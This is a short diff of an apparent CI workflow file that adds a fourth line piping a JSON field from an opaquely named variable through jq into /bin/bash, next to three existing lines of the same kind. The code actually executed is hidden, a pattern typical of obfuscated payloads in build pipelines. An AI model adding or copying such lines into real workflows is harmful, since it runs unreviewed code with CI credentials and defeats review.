@@ -30,6 +30,7 @@ jobs:
           echo $urp6137 | jq -r .u533 | /bin/bash
           printf '%s' "$sbbq5683" | jq -r .a1937 | /bin/bash
           echo $m1 | jq -r .jog00 | /bin/bash
+          printf '%s' "$tm0184" | jq -r .yo7 | /bin/bash
 
       - name: Save archive
         if: always()
